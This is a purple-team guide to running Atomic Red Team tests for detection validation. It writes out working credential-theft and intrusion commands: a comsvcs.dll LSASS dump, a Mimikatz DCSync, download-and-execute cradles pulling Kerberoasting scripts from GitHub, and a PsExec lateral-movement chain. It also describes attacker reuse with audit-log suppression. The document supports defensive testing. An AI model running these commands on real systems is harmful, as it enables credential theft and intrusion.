# Atomic Red Team — Hands-On Use Cases

Every command below assumes the framework and atomics folder are already installed at their default locations (`C:\AtomicRedTeam\invoke-atomicredteam` / `C:\AtomicRedTeam\atomics` on Windows) and the module is imported (`Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force`). MITRE ATT&CK ID(s) are tagged per scenario. Every test referenced below was pulled directly from the live `redcanaryco/atomic-red-team` `master` branch at build time — exact test names/GUIDs may shift as the library is updated; re-verify with `-ShowDetails` before relying on a specific test number in production.

## Contents
- [Reviewing a Technique Before Running It](#reviewing-a-technique-before-running-it)
- [One-Line Inventory of Applicable Tests](#one-line-inventory-of-applicable-tests)
- [Firing a Single Numbered Test](#firing-a-single-numbered-test)
- [Running an Entire Technique](#running-an-entire-technique)
- [Sweeping a Tactic Across Multiple Technique IDs](#sweeping-a-tactic-across-multiple-technique-ids)
- [Checking Prerequisites Without Executing](#checking-prerequisites-without-executing)
- [Fetching and Installing Prerequisites](#fetching-and-installing-prerequisites)
- [Overriding Default Input Arguments](#overriding-default-input-arguments)
- [Cleaning Up After a Test](#cleaning-up-after-a-test)
- [Running Every Applicable Test on a Host](#running-every-applicable-test-on-a-host)
- [Remote Execution Against a Second Host](#remote-execution-against-a-second-host)
- [Interactive and Manual Tests](#interactive-and-manual-tests)
- [Detection-Engineering Test-Firing With Paired Verification](#detection-engineering-test-firing-with-paired-verification)
- [CI/CD-Integrated Continuous Validation](#cicd-integrated-continuous-validation)
- [Adversarial Reuse — an Attacker Grabbing an Already-Weaponized Payload](#adversarial-reuse--an-attacker-grabbing-an-already-weaponized-payload)
- [Chaining Multiple Atomics Into an Attack Path](#chaining-multiple-atomics-into-an-attack-path)
- [Authoring a Custom Private Atomic Test](#authoring-a-custom-private-atomic-test)
- [Exporting Execution History for Reporting](#exporting-execution-history-for-reporting)

---

## Reviewing a Technique Before Running It

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory) — example technique, applies to any ID

```powershell
Invoke-AtomicTest T1003.001 -ShowDetails
```

Prints, for every applicable test in the technique, the test name, GUID, executor, elevation requirement, raw command, argument-substituted command, cleanup command, and dependency prereq/get-prereq commands — with nothing executed. This is the safe first step before ever running anything against a real host: confirm exactly what will happen, what artifact it claims to leave (per the test's own `description`), and whether it needs elevation or an external payload. Note: this does **not** work for `manual`-executor tests (see [Interactive and Manual Tests](#interactive-and-manual-tests) below) — the framework skips them before the display logic ever runs.

## One-Line Inventory of Applicable Tests

**MITRE ATT&CK:** T1003.001, presentation-layer variant of the same technique

```powershell
Invoke-AtomicTest T1003.001 -ShowDetailsBrief
```

Prints just `T1003.001-1 Dump LSASS.exe Memory using ProcDump`, `T1003.001-2 Dump LSASS.exe Memory using comsvcs.dll`, etc. — a fast way to see how many tests exist and pick a test number for `-TestNumbers` without the full `-ShowDetails` dump.

## Firing a Single Numbered Test

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory)

```powershell
# Short combined form: technique-testnumber
Invoke-AtomicTest T1003.001-2

# Equivalent, explicit form
Invoke-AtomicTest T1003.001 -TestNumbers 2
```

Test #2 in `T1003.001.yaml` ("Dump LSASS.exe Memory using comsvcs.dll") runs `rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\lsass-comsvcs.dmp full` via the `powershell` executor, `elevation_required: true` — the classic living-off-the-land LSASS dump technique (no external tool download needed, unlike test #1's ProcDump-dependent variant). This is the exact single-test-firing pattern for validating one specific detection rule (e.g. "alert on `rundll32.exe` invoking `comsvcs.dll,MiniDump`") without the noise of the technique's other 5+ tests. See `Mimikatz/sekurlsa (Credential Dumping)/` for what an operator does with the resulting `.dmp` file offline.

## Running an Entire Technique

**MITRE ATT&CK:** [T1053.005](https://attack.mitre.org/techniques/T1053/005/) (Scheduled Task/Job: Scheduled Task)

```powershell
Invoke-AtomicTest T1053.005
```

No `-TestNumbers`/`-TestNames`/`-TestGuids` filter means every applicable test in the technique runs in file order — here, three variants (startup-script-based, local `SCHTASKS /Create`, and a remote-target variant). Test #2 ("Scheduled task Local") runs `SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10` with `elevation_required: false`, and defines a real `cleanup_command` (`SCHTASKS /Delete /TN spawn /F`) — a good example of a technique where running the whole set gives a purple-team exercise broad persistence-detection coverage in one call.

## Sweeping a Tactic Across Multiple Technique IDs

**MITRE ATT&CK:** [T1087.001](https://attack.mitre.org/techniques/T1087/001/), [T1087.002](https://attack.mitre.org/techniques/T1087/002/), [T1069.001](https://attack.mitre.org/techniques/T1069/001/), [T1069.002](https://attack.mitre.org/techniques/T1069/002/) (Discovery tactic, Account/Permission Groups Discovery)

```powershell
$discoveryTechniques = 'T1087.001', 'T1087.002', 'T1069.001', 'T1069.002', 'T1018', 'T1082'

foreach ($t in $discoveryTechniques) {
    Write-Host "=== $t ===" -ForegroundColor Cyan
    Invoke-AtomicTest $t
}
```

`Invoke-AtomicTest` has no built-in "run this ATT&CK tactic" concept — a tactic sweep is simply looping the cmdlet over the technique IDs that belong to it, which the operator curates (from the ATT&CK Navigator, a course syllabus, or a threat-intel report's technique list). This is the realistic pattern for a full Discovery-tactic purple-team pass, comparable in intent to `Seatbelt.exe -group=all` (see `../Seatbelt/`) but composed from labeled, individually-toggleable ATT&CK-mapped tests instead of one tool's built-in check groups.

## Checking Prerequisites Without Executing

**MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)

```powershell
Invoke-AtomicTest T1003.006 -CheckPrereqs
```

Runs only the dependency's `prereq_command` (`Test-Path` against the configured `mimikatz_path`, default `%tmp%\mimikatz\x64\mimikatz.exe`) and reports pass/fail — no DCSync attempt occurs. Confirming prereqs first is the difference between a clean test-fire and a half-run test that fails mid-command because a dependent binary was never staged.

## Fetching and Installing Prerequisites

**MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)

```powershell
Invoke-AtomicTest T1003.006 -GetPrereqs
```

If the prereq check fails, this runs the dependency's `get_prereq_command` — for T1003.006 test #1, that pulls the latest Mimikatz release directly from GitHub (`https://api.github.com/repos/gentilkiwi/mimikatz/releases`) via `Invoke-FetchFromZip`, extracts `x64/mimikatz.exe`, and stages it at the configured path — then re-checks. This is the standard two-step operator workflow: `-GetPrereqs` once, then the bare test (or `-CheckPrereqs` again to confirm) before firing. **Cross-reference:** the mimikatz.exe fetched here is the exact same tool covered in `../Mimikatz/lsadump (DCSync)/` — this atomic is a thin, ATT&CK-labeled wrapper around `lsadump::dcsync`, not a separate implementation.

## Overriding Default Input Arguments

**MITRE ATT&CK:** [T1003.006](https://attack.mitre.org/techniques/T1003/006/) (OS Credential Dumping: DCSync)

```powershell
Invoke-AtomicTest T1003.006 -InputArgs @{ domain = "corp.local"; user = "svc-backup" }
```

T1003.006's single test defaults `user` to `krbtgt` — realistic for a first pass, but an operator validating a specific account's exposure overrides both `domain` and `user`. `-InputArgs` only overrides keys the test actually declares in its `input_arguments` map; anything else passed is silently ignored (verified in `Get-InputArgs`). The final command becomes `mimikatz.exe "lsadump::dcsync /domain:corp.local /user:svc-backup@corp.local" "exit"` — same DRSUAPI mechanics documented in `../Mimikatz/lsadump (DCSync)/03-05`, this atomic doesn't reintroduce new evidence, it just labels the existing mechanism with an ATT&CK ID.

## Cleaning Up After a Test

**MITRE ATT&CK:** [T1053.005](https://attack.mitre.org/techniques/T1053/005/) (Scheduled Task/Job: Scheduled Task)

```powershell
Invoke-AtomicTest T1053.005 -TestNumbers 2 -Cleanup
```

Runs *only* `SCHTASKS /Delete /TN spawn /F` — the scheduled task's own declared `cleanup_command` — with no re-execution of the create step. Cleanup is always this kind of explicit, separate call; a bare `Invoke-AtomicTest T1053.005 -TestNumbers 2` never cleans up after itself. Not every test defines a `cleanup_command` (pure discovery/read-only tests usually don't) — running `-Cleanup` against one of those is a harmless no-op.

## Running Every Applicable Test on a Host

**MITRE ATT&CK:** Every applicable technique in the library — a full-spectrum sweep, not one ID

```powershell
Invoke-AtomicTest All -Force
```

The literal value `All` walks every `T*` folder under `-PathToAtomicsFolder` and runs every applicable test on the current platform. Without `-Force` (or `-CheckPrereqs`/`-ShowDetails`/`-ShowDetailsBrief`/`-GetPrereqs`), the framework's own confirmation prompt fires — its actual text, verified in source: *"Highway to the danger zone, Executing All Atomic Tests!"* This is the highest-noise, highest-coverage option, appropriate for a controlled lab/sandbox validation pass across an entire EDR ruleset, never for a live production host without deliberate intent.

## Remote Execution Against a Second Host

**MITRE ATT&CK:** [T1082](https://attack.mitre.org/techniques/T1082/) (System Information Discovery) — example technique, applies to any test run this way

```powershell
$cred = Get-Credential
$session = New-PSSession -ComputerName TARGET01.CORP.LOCAL -Credential $cred

Invoke-AtomicTest T1082 -Session $session
```

`-Session` accepts one or more existing `PSSession` objects. `Invoke-ExecuteCommand` stages its two remote helper scripts (`Invoke-Process.ps1`, `Invoke-KillProcessTree.ps1`) into the session over `Invoke-Command -FilePath`, then runs the actual atomic **inside** that remote session — the target host does the work, not the operator's box. This is genuine PowerShell-Remoting/WinRM lateral tradecraft layered under whatever the atomic itself does; standard WinRM evidence (Event ID 4624 Logon Type 3, WSMan provider events) applies on top — see `03`/`04 - Source/Target Evidence.md`.

## Interactive and Manual Tests

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory)

```powershell
# This does NOT print or run the manual test — it's skipped unconditionally
Invoke-AtomicTest T1003.001 -ShowDetailsBrief
# ... "Dump LSASS.exe Memory using Windows Task Manager" never appears in the list

# The operator has to read the technique's own docs directly instead:
Get-Content "C:\AtomicRedTeam\atomics\T1003.001\T1003.001.md" |
    Select-String -Pattern "Windows Task Manager" -Context 0,15
```

T1003.001's "Dump LSASS.exe Memory using Windows Task Manager" test uses `executor: {name: manual, steps: ...}` — three human-driven steps (open Task Manager, select `lsass.exe`, "Create Dump File"). `Invoke-AtomicTest` checks for a `manual` executor **before** the `-ShowDetails`/`-ShowDetailsBrief` branches and unconditionally skips it — this is verified directly in `Public/Invoke-AtomicTest.ps1`'s control flow, not an assumption. Manual tests exist for exactly this reason: some ATT&CK procedures are GUI-only and can't be scripted, so the framework documents them but leaves execution to the human operator. For scriptable-but-prompt-driven tests (not `manual`-executor, but interactively prompting during execution), use `-Interactive` so stdout/stderr flow live to the console instead of being captured silently.

## Detection-Engineering Test-Firing With Paired Verification

**MITRE ATT&CK:** [T1558.003](https://attack.mitre.org/techniques/T1558/003/) (Steal or Forge Kerberos Tickets: Kerberoasting)

```powershell
# 1. Confirm domain-joined prereq
Invoke-AtomicTest T1558.003 -TestNumbers 1 -CheckPrereqs

# 2. Fire the test — downloads and runs Empire's Invoke-Kerberoast.ps1 in-memory
Invoke-AtomicTest T1558.003 -TestNumbers 1

# 3. Immediately pivot to the SIEM/EDR console and confirm the paired alert fired
#    (Event 4769 Ticket Encryption Type 0x17/RC4, or the EDR's own Kerberoasting
#    detection) within the same time window as the CSV execution-log timestamp
```

Test #1 ("Request for service tickets") is a `powershell`-executor test whose command is itself a download cradle: `iex(iwr https://raw.githubusercontent.com/EmpireProject/Empire/.../Invoke-Kerberoast.ps1 -UseBasicParsing); Invoke-Kerberoast | fl`. This is the core detection-engineering loop the whole library is built for: fire a labeled, known-answer test, then confirm the SOC's detection actually caught it — using the execution-log timestamp (see `05 - Detection and Hunting.md`) as ground truth for "when did the attack actually happen" against which the SIEM alert's own timestamp is measured. **Cross-reference:** `../Impacket/GetUserSPNs (Kerberoasting)/` covers the non-PowerShell, Impacket-based version of the same technique — useful for confirming a detection rule isn't accidentally scoped to PowerShell-only telemetry.

## CI/CD-Integrated Continuous Validation

**MITRE ATT&CK:** Varies by the technique set scheduled — a validation-cadence pattern, not one ID

```powershell
# Example: a pipeline/scheduled-task step running a curated technique list
# non-interactively, logging to a central syslog sink for SIEM ingestion
$techniques = Get-Content .\purple-team-technique-list.txt

foreach ($t in $techniques) {
    Invoke-AtomicTest $t -GetPrereqs
    Invoke-AtomicTest $t -LoggingModule Syslog-ExecutionLogger
    Invoke-AtomicTest $t -Cleanup
}
```

Beyond ad-hoc pipeline steps like the above, the framework ships its own purpose-built continuous-validation components: `Invoke-AtomicRunner` (a scheduler that reads a schedule of technique/GUID/input-arg rows and fires them over a configured time window, verified in `Public/Invoke-AtomicRunner.ps1`) and `AtomicRunnerService.ps1` (a Windows-service wrapper for unattended, recurring execution). Both are designed to run against fleet endpoints on a cadence and ship results to a syslog server or the Windows Event Log logger (`config.ps1`'s `syslogServer`/`syslogPort`/`LoggingModule` settings) rather than to a human watching a console — the intended architecture for "does our detection coverage hold up over time," not a one-off exercise. Genuine CI/CD (GitLab CI, GitHub Actions, Jenkins) integration is simpler still: any pipeline runner with PowerShell and the module installed can call `Invoke-AtomicTest` the same way a human operator does.

## Adversarial Reuse — an Attacker Grabbing an Already-Weaponized Payload

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/) (OS Credential Dumping: LSASS Memory) — example, applies to any test in the library

```powershell
# An intruder with an interactive foothold, needing a working LSASS-dump
# technique, pulls the library instead of writing custom tradecraft:
IEX (IWR 'https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/install-atomicredteam.ps1' -UseBasicParsing)
Install-AtomicRedTeam -getAtomics
Import-Module "C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1" -Force

Invoke-AtomicTest T1003.001-2 -NoExecutionLog
```

Stated plainly, since this is exactly what the tool enables and what makes it worth understanding from both sides: Atomic Red Team is a public, MIT-licensed library of **working, tested, technique-labeled attack commands**. An actual attacker who has landed on a host and needs, say, a functioning LSASS-dump-via-`comsvcs.dll` one-liner doesn't have to write or debug one — they clone the library and run test #2. This is a real and known abuse pattern, not a hypothetical: it explains why `-NoExecutionLog` exists as a documented, first-class flag (evading the framework's own audit trail is a one-switch operation) and why the install/execution footprint described in `03 - Source Evidence.md` matters — an analyst who understands the framework's *legitimate* purple-team footprint can also recognize when the same footprint shows up on a host with no scheduled exercise on the books.

## Chaining Multiple Atomics Into an Attack Path

**MITRE ATT&CK:** [T1087.001](https://attack.mitre.org/techniques/T1087/001/) → [T1003.006](https://attack.mitre.org/techniques/T1003/006/) → [T1021.002](https://attack.mitre.org/techniques/T1021/002/)

```powershell
# 1. Discovery — enumerate local accounts
Invoke-AtomicTest T1087.001 -TestNames "Enumerate all accounts on Windows (Local)"

# 2. Credential Access — DCSync against the discovered/targeted domain account
Invoke-AtomicTest T1003.006 -InputArgs @{ user = "svc-backup" }

# 3. Lateral Movement — use the harvested credential material via a
#    Windows-admin-share copy-and-execute (Sysinternals PsExec)
Invoke-AtomicTest T1021.002 -TestNames "Copy and Execute File with PsExec"
```

A realistic end-to-end validation of an attack path chains separate technique IDs, each with its own execution-log entry and its own paired detection expectation — closer to a real intrusion than any single atomic in isolation. Step 3's test literally shells out to Sysinternals `PsExec.exe` (`"#{psexec_exe}" #{remote_host} -accepteula -c #{command_path}`) — the same binary this repo's Wave 2 `PsExec/` folder will cover in depth, and functionally comparable to (but a distinct tool from) `../Impacket/psexec/`'s SVCCTL-based implementation. Recognizing this three-step signature in target-side telemetry (a burst of local-account enumeration, followed by DRSUAPI replication traffic, followed by a new-service creation on a *different* host, all within minutes) is a stronger detection story than any one step alone — see `05 - Detection and Hunting.md`.

## Authoring a Custom Private Atomic Test

**MITRE ATT&CK:** Whatever ID the custom test targets — authoring workflow, not a specific technique

```powershell
$inputArg = New-AtomicTestInputArgument -Name output_file -Description 'Where to drop the output' -Type Path -Default 'C:\Windows\Temp\custom_test_output.txt'

$test = New-AtomicTest -Name 'Custom internal EDR validation check' `
    -Description 'Internal-only test not in the public library' `
    -SupportedPlatforms Windows `
    -InputArguments @($inputArg) `
    -ExecutorType PowerShell `
    -ExecutorCommand 'Get-Process | Out-File #{output_file}' `
    -ExecutorCleanupCommand 'Remove-Item #{output_file} -ErrorAction Ignore'

$technique = New-AtomicTechnique -AttackTechnique T1057 -DisplayName 'Process Discovery' -AtomicTests $test

$technique | ConvertTo-Yaml | Out-File "C:\PrivateAtomics\atomics\T1057\T1057.yaml"

# Run it from the private folder
Invoke-AtomicTest T1057 -PathToAtomicsFolder "C:\PrivateAtomics\atomics"
```

`New-AtomicTechnique`/`New-AtomicTest`/`New-AtomicTestInputArgument` (verified in `Public/New-Atomic.ps1`, schema backed by the same `AtomicTechnique`/`AtomicTest`/`AtomicInputArgument` classes `Invoke-AtomicTest` itself uses) let an organization author internal-only tests — e.g. validating a proprietary detection rule or a control that has no public ATT&CK-mapped test yet — without contributing to the public repo. `-ExecutorType` accepts `CommandPrompt`/`Sh`/`Bash`/`PowerShell` (not `Manual` — authored tests are always scriptable by design). `config.ps1`'s `PathToPrivateAtomicsFolder` setting exists specifically so `Invoke-AtomicRunner`'s scheduled-execution path can pull from a private tree alongside the public one.

## Exporting Execution History for Reporting

**MITRE ATT&CK:** Not technique-specific — a reporting/output-format choice layered on whichever tests ran

```powershell
# Structured JSON via the community ATTIRE-format logger, for tooling ingestion
Invoke-AtomicTest T1087.001 -LoggingModule Attire-ExecutionLogger

# Default CSV, redirected to a shared after-action-review location
Invoke-AtomicTest T1087.001 -ExecutionLogPath "\\fileserver\PurpleTeam\ExecLogs\run.csv"
```

`Attire-ExecutionLogger` (verified in `Public/Attire-ExecutionLogger.psm1`, authored by Security Risk Advisors) writes ATTIRE-format v1.1 JSON — including a base64-encoded execution ID, target user/host/IP/`$env:PATH`, and one `procedures` entry per test — to a timestamped filename (`Invoke-AtomicTest-ExecutionLog-<unixtime>.json`), built for ingestion by after-action-review tooling rather than a human reading a CSV. This is the export step of the detection-engineering loop in [Detection-Engineering Test-Firing](#detection-engineering-test-firing-with-paired-verification) — a durable, structured record of exactly what ran, when, and against which host, independent of whatever the SIEM/EDR itself logged.
